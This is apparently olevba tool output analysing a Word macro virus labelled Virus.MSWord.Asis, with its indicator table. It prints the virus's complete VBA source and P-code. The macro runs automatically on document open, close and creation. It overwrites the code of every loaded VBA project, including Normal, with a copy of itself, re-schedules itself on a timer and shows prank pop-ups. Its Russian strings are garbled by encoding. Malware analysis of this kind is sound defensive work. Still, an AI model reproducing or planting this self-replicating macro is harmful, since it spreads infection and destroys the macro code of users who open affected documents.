olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Asis
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Asis - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Private Sub Document_Close()
On Error Resume Next
Document_Open
End Sub

Private Sub Document_New()
On Error Resume Next
Document_Open
End Sub

Private Sub Document_Open()
On Error Resume Next
    With Options
 '       .SaveNormalPrompt = False
'        .VirusProtection = False
    End With
Dim I%, j%, k As Long, m As Boolean
Application.OnTime When:=Now + TimeValue("00:" & Format(Int(Rnd * 5) + 1, "00") & ":00"), Name:=VBE.VBProjects(1).Name & "." & VBE.VBProjects(1).VBComponents(1).Name & ".OnTimer"
For I = 1 To VBE.VBProjects.Count
 For j = 1 To VBE.VBProjects(I).VBComponents.Count
  With VBE.VBProjects(I).VBComponents(j).CodeModule
     If .CountOfLines > 80 Or .CountOfLines < 50 Then
     .deletelines 1, .CountOfLines
     Err.Clear
      .AddFromString Me.VBProject.VBComponents(Me.CodeName).CodeModule.Lines(1, Me.VBProject.VBComponents(Me.CodeName).CodeModule.CountOfLines)
      If Err = 0 Then
        m = False
        For k = .CountOfLines To .CountOfLines - 20 Step -1
           If .Find("Sub OnTimer", k, 1, k, 30) Then m = True: Exit For
        Next
        If m Then
            .deletelines k
            '.InsertLines k, IIf(VBE.VBProjects(I).Name = "Normal", "Sub OnTimer()", "Private Sub OnTimer1()")
        End If
      Else
      Application.OnTime When:=Now + TimeValue("00:00:10"), Name:=VBE.VBProjects(1).Name & "." & VBE.VBProjects(1).VBComponents(1).Name & ".OnTimer"
      End If
     End If
  End With
 Next
Next
End Sub
Private Sub ShowMess()
On Error Resume Next
If Left(Application.Version, 1) = "8" Then
  ShVer8
Else
 If MsgBox(GetMess(), vbOKCancel, Choose(Int(Rnd * 9) + 1, "Ń 1 Ŕďđĺë˙ Âŕń!", "Îďŕ?-Óăó!", "Ŕ âîň č ńĺăîäí˙říčé ďđčęîë", "Word: Ýňî ˙ áóęâŕëüíî ňîëüęî ÷ňî ďđčäóěŕë", "őĺ-őĺ", "Word: Ýňî ˙ â Đóńńęîě đŕäčî óńëűřŕë", "Đĺęëŕěíŕ˙ ńëóćáŕ Microsoft Word", "Word: Çŕäîëáŕëč ěĺí˙ ýňč ěŕęđîâčđóńű", "Âîň Âŕě," & Application.UserName, "Ďîńëĺäíčé ďđčęîë ńĺçîíŕ", "Word: Îé, ńĺé÷ŕń îďčńŕţńü...")) = 1 Then ShowMess
End If
End Sub
Private Sub ShVer8()
 On Error Resume Next
 Assistant.Visible = True
 Dim bln As Balloon
 Set bln = Assistant.NewBalloon
 With bln
  .Mode = msoModeAutoDown
  .Heading = GetMess()
  .Animation = Int(Rnd * (117))
  .Button = msoButtonSetNextClose
  .Text = Choose(Int(Rnd * 14) + 1, "Ń 1 Ŕďđĺë˙ Âŕń, " & Application.UserName & Space(100) & Assistant.Name, "Îďŕ?-Óăó!", "", "", "óěđó îň ńěĺőŕ", "ďđŕâäŕ ńěĺříî", "Ŕ âîň č ńĺăîäí˙říčé ďđčęîë", Assistant.Name & ": Ýňî ˙ áóęâŕëüíî ňîëüęî ÷ňî ďđčäóěŕë", Assistant.Name & ": Îé, ńĺé÷ŕń îďčńŕţńü...", "őĺ-őĺ", Assistant.Name & ": Ýňî ˙ â Đóńńęîě đŕäčî óńëűřŕë", "Đĺęëŕěíŕ˙ ńëóćáŕ Microsoft Word", Assistant.Name & ": Çŕäîëáŕëč ěĺí˙ ýňč ěŕęđîâčđóńű", "Âîň Âŕě," & Application.UserName, "Ďîńëĺäíčé ďđčęîë ńĺçîíŕ")
  If .Show = -6 Then ShowMess
 End With
 Assistant.Animation = 0
End Sub
Private Function GetMess()
On Error Resume Next
GetMess = Mid(Me.VBProject.VBComponents(Me.CodeName).CodeModule.Lines(Int(Rnd * Me.VBProject.VBComponents(Me.CodeName).CodeModule.CountOfDeclarationLines) + 1, 1), 2)
End Function
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Asis
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 5998 bytes
' Line #0:
' Line #1:
' 	FuncDefn (Private Sub Document_Close())
' Line #2:
' 	OnError (Resume Next) 
' Line #3:
' 	ArgsCall Document_Open 0x0000 
' Line #4:
' 	EndSub 
' Line #5:
' Line #6:
' 	FuncDefn (Private Sub Document_New())
' Line #7:
' 	OnError (Resume Next) 
' Line #8:
' 	ArgsCall Document_Open 0x0000 
' Line #9:
' 	EndSub 
' Line #10:
' Line #11:
' 	FuncDefn (Private Sub Document_Open())
' Line #12:
' 	OnError (Resume Next) 
' Line #13:
' 	StartWithExpr 
' 	Ld Options 
' 	With 
' Line #14:
' 	QuoteRem 0x0001 0x0020 "       .SaveNormalPrompt = False"
' Line #15:
' 	QuoteRem 0x0000 0x0020 "        .VirusProtection = False"
' Line #16:
' 	EndWith 
' Line #17:
' 	Dim 
' 	VarDefn I
' 	VarDefn j
' 	VarDefn k (As Long)
' 	VarDefn m (As Boolean)
' Line #18:
' 	Ld Now 
' 	LitStr 0x0003 "00:"
' 	Ld Rnd 
' 	LitDI2 0x0005 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Add 
' 	LitStr 0x0002 "00"
' 	ArgsLd Format$ 0x0002 
' 	Concat 
' 	LitStr 0x0003 ":00"
' 	Concat 
' 	ArgsLd TimeValue 0x0001 
' 	Add 
' 	ParamNamed When 
' 	LitDI2 0x0001 
' 	Ld VBE 
' 	ArgsMemLd VBProjects 0x0001 
' 	MemLd New 
' 	LitStr 0x0001 "."
' 	Concat 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld VBE 
' 	ArgsMemLd VBProjects 0x0001 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	Concat 
' 	LitStr 0x0008 ".OnTimer"
' 	Concat 
' 	ParamNamed New 
' 	Ld Application 
' 	ArgsMemCall OnTime 0x0002 
' Line #19:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld VBE 
' 	MemLd VBProjects 
' 	MemLd Count 
' 	For 
' Line #20:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld I 
' 	Ld VBE 
' 	ArgsMemLd VBProjects 0x0001 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #21:
' 	StartWithExpr 
' 	Ld j 
' 	Ld I 
' 	Ld VBE 
' 	ArgsMemLd VBProjects 0x0001 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	With 
' Line #22:
' 	MemLdWith CountOfLines 
' 	LitDI2 0x0050 
' 	Gt 
' 	MemLdWith CountOfLines 
' 	LitDI2 0x0032 
' 	Lt 
' 	Or 
' 	IfBlock 
' Line #23:
' 	LitDI2 0x0001 
' 	MemLdWith CountOfLines 
' 	ArgsMemCallWith deletelines 0x0002 
' Line #24:
' 	Ld Err 
' 	ArgsMemCall Clear 0x0000 
' Line #25:
' 	LitDI2 0x0001 
' 	Ld id_FFFF 
' 	MemLd CodeName 
' 	Ld id_FFFF 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld id_FFFF 
' 	MemLd CodeName 
' 	Ld id_FFFF 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	ArgsMemCallWith AddFromString 0x0001 
' Line #26:
' 	Ld Err 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #27:
' 	LitVarSpecial (False)
' 	St m 
' Line #28:
' 	StartForVariable 
' 	Ld k 
' 	EndForVariable 
' 	MemLdWith CountOfLines 
' 	MemLdWith CountOfLines 
' 	LitDI2 0x0014 
' 	Sub 
' 	LitDI2 0x0001 
' 	UMi 
' 	ForStep 
' Line #29:
' 	LitStr 0x000B "Sub OnTimer"
' 	Ld k 
' 	LitDI2 0x0001 
' 	Ld k 
' 	LitDI2 0x001E 
' 	ArgsMemLdWith Find 0x0005 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St m 
' 	BoS 0x0000 
' 	ExitFor 
' 	EndIf 
' Line #30:
' 	StartForVariable 
' 	Next 
' Line #31:
' 	Ld m 
' 	IfBlock 
' Line #32:
' 	Ld k 
' 	ArgsMemCallWith deletelines 0x0001 
' Line #33:
' 	QuoteRem 0x000C 0x0061 ".InsertLines k, IIf(VBE.VBProjects(I).Name = "Normal", "Sub OnTimer()", "Private Sub OnTimer1()")"
' Line #34:
' 	EndIfBlock 
' Line #35:
' 	ElseBlock 
' Line #36:
' 	Ld Now 
' 	LitStr 0x0008 "00:00:10"
' 	ArgsLd TimeValue 0x0001 
' 	Add 
' 	ParamNamed When 
' 	LitDI2 0x0001 
' 	Ld VBE 
' 	ArgsMemLd VBProjects 0x0001 
' 	MemLd New 
' 	LitStr 0x0001 "."
' 	Concat 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld VBE 
' 	ArgsMemLd VBProjects 0x0001 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	Concat 
' 	LitStr 0x0008 ".OnTimer"
' 	Concat 
' 	ParamNamed New 
' 	Ld Application 
' 	ArgsMemCall OnTime 0x0002 
' Line #37:
' 	EndIfBlock 
' Line #38:
' 	EndIfBlock 
' Line #39:
' 	EndWith 
' Line #40:
' 	StartForVariable 
' 	Next 
' Line #41:
' 	StartForVariable 
' 	Next 
' Line #42:
' 	EndSub 
' Line #43:
' 	FuncDefn (Private Sub ShowMess())
' Line #44:
' 	OnError (Resume Next) 
' Line #45:
' 	Ld Application 
' 	MemLd Version 
' 	LitDI2 0x0001 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0001 "8"
' 	Eq 
' 	IfBlock 
' Line #46:
' 	ArgsCall ShVer8 0x0000 
' Line #47:
' 	ElseBlock 
' Line #48:
' 	ArgsLd GetMess 0x0000 
' 	Ld vbOKCancel 
' 	Ld Rnd 
' 	LitDI2 0x0009 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Add 
' 	LitStr 0x000F "Ń 1 Ŕďđĺë˙ Âŕń!"
' 	LitStr 0x0009 "Îďŕ?-Óăó!"
' 	LitStr 0x001A "Ŕ âîň č ńĺăîäí˙říčé ďđčęîë"
' 	LitStr 0x0029 "Word: Ýňî ˙ áóęâŕëüíî ňîëüęî ÷ňî ďđčäóěŕë"
' 	LitStr 0x0005 "őĺ-őĺ"
' 	LitStr 0x0023 "Word: Ýňî ˙ â Đóńńęîě đŕäčî óńëűřŕë"
' 	LitStr 0x001F "Đĺęëŕěíŕ˙ ńëóćáŕ Microsoft Word"
' 	LitStr 0x0024 "Word: Çŕäîëáŕëč ěĺí˙ ýňč ěŕęđîâčđóńű"
' 	LitStr 0x0008 "Âîň Âŕě,"
' 	Ld Application 
' 	MemLd UserName 
' 	Concat 
' 	LitStr 0x0017 "Ďîńëĺäíčé ďđčęîë ńĺçîíŕ"
' 	LitStr 0x001C "Word: Îé, ńĺé÷ŕń îďčńŕţńü..."
' 	ArgsLd Choose 0x000C 
' 	ArgsLd MsgBox 0x0003 
' 	LitDI2 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ArgsCall ShowMess 0x0000 
' 	EndIf 
' Line #49:
' 	EndIfBlock 
' Line #50:
' 	EndSub 
' Line #51:
' 	FuncDefn (Private Sub ShVer8())
' Line #52:
' 	OnError (Resume Next) 
' Line #53:
' 	LitVarSpecial (True)
' 	Ld Assistant 
' 	MemSt Visible 
' Line #54:
' 	Dim 
' 	VarDefn bln (As Balloon)
' Line #55:
' 	SetStmt 
' 	Ld Assistant 
' 	MemLd NewBalloon 
' 	Set bln 
' Line #56:
' 	StartWithExpr 
' 	Ld bln 
' 	With 
' Line #57:
' 	Ld msoModeAutoDown 
' 	MemStWith Mode 
' Line #58:
' 	ArgsLd GetMess 0x0000 
' 	MemStWith Heading 
' Line #59:
' 	Ld Rnd 
' 	LitDI2 0x0075 
' 	Paren 
' 	Mul 
' 	FnInt 
' 	MemStWith Animation 
' Line #60:
' 	Ld msoButtonSetNextClose 
' 	MemStWith Button 
' Line #61:
' 	Ld Rnd 
' 	LitDI2 0x000E 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Add 
' 	LitStr 0x0010 "Ń 1 Ŕďđĺë˙ Âŕń, "
' 	Ld Application 
' 	MemLd UserName 
' 	Concat 
' 	LitDI2 0x0064 
' 	ArgsLd Space 0x0001 
' 	Concat 
' 	Ld Assistant 
' 	MemLd New 
' 	Concat 
' 	LitStr 0x0009 "Îďŕ?-Óăó!"
' 	LitStr 0x0000 ""
' 	LitStr 0x0000 ""
' 	LitStr 0x000D "óěđó îň ńěĺőŕ"
' 	LitStr 0x000D "ďđŕâäŕ ńěĺříî"
' 	LitStr 0x001A "Ŕ âîň č ńĺăîäí˙říčé ďđčęîë"
' 	Ld Assistant 
' 	MemLd New 
' 	LitStr 0x0025 ": Ýňî ˙ áóęâŕëüíî ňîëüęî ÷ňî ďđčäóěŕë"
' 	Concat 
' 	Ld Assistant 
' 	MemLd New 
' 	LitStr 0x0018 ": Îé, ńĺé÷ŕń îďčńŕţńü..."
' 	Concat 
' 	LitStr 0x0005 "őĺ-őĺ"
' 	Ld Assistant 
' 	MemLd New 
' 	LitStr 0x001F ": Ýňî ˙ â Đóńńęîě đŕäčî óńëűřŕë"
' 	Concat 
' 	LitStr 0x001F "Đĺęëŕěíŕ˙ ńëóćáŕ Microsoft Word"
' 	Ld Assistant 
' 	MemLd New 
' 	LitStr 0x0020 ": Çŕäîëáŕëč ěĺí˙ ýňč ěŕęđîâčđóńű"
' 	Concat 
' 	LitStr 0x0008 "Âîň Âŕě,"
' 	Ld Application 
' 	MemLd UserName 
' 	Concat 
' 	LitStr 0x0017 "Ďîńëĺäíčé ďđčęîë ńĺçîíŕ"
' 	ArgsLd Choose 0x0010 
' 	MemStWith Then 
' Line #62:
' 	MemLdWith Show 
' 	LitDI2 0x0006 
' 	UMi 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ArgsCall ShowMess 0x0000 
' 	EndIf 
' Line #63:
' 	EndWith 
' Line #64:
' 	LitDI2 0x0000 
' 	Ld Assistant 
' 	MemSt Animation 
' Line #65:
' 	EndSub 
' Line #66:
' 	FuncDefn (Private Function GetMess(id_FFFE As Variant))
' Line #67:
' 	OnError (Resume Next) 
' Line #68:
' 	Ld Rnd 
' 	Ld id_FFFF 
' 	MemLd CodeName 
' 	Ld id_FFFF 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfDeclarationLines 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Add 
' 	LitDI2 0x0001 
' 	Ld id_FFFF 
' 	MemLd CodeName 
' 	Ld id_FFFF 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitDI2 0x0002 
' 	ArgsLd Mid$ 0x0002 
' 	St GetMess 
' Line #69:
' 	EndFunc 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_New        |Runs when a new Word document is created     |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

